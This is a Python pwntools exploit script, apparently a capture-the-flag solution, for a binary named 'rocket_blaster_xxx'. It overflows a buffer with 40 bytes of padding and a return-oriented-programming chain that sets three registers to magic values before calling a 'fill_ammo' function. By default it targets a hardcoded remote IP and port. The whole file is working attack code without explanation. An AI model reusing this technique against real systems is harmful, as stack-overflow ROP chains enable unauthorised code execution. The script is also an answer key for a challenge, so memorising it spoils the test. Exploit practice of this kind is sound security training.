#!/usr/bin/env python3
from pwn import *
import argparse

context.arch = 'amd64'
context.log_level = 'info'

def exploit(target, port=None):
    if port:
        p = remote(target, port)
    else:
        p = process(['./challenge/rocket_blaster_xxx'], env={'LD_LIBRARY_PATH': './challenge/glibc/'})

    pop_rdi = 0x40159f
    pop_rsi = 0x40159d
    pop_rdx = 0x40159b
    ret = 0x40101a
    fill_ammo = 0x4012f5

    payload = b'A' * 40
    payload += p64(pop_rdi)
    payload += p64(0xdeadbeef)
    payload += p64(pop_rsi)
    payload += p64(0xdeadbabe)
    payload += p64(pop_rdx)
    payload += p64(0xdead1337)
    payload += p64(ret)
    payload += p64(fill_ammo)

    assert len(payload) == 104

    p.send(payload)
    output = p.recvall(timeout=5)
    print(output.decode('latin-1', errors='replace'))
    p.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target', nargs='?', default='154.57.164.68')
    parser.add_argument('port', nargs='?', default='31194')
    args = parser.parse_args()
    exploit(args.target, int(args.port) if args.port else None)
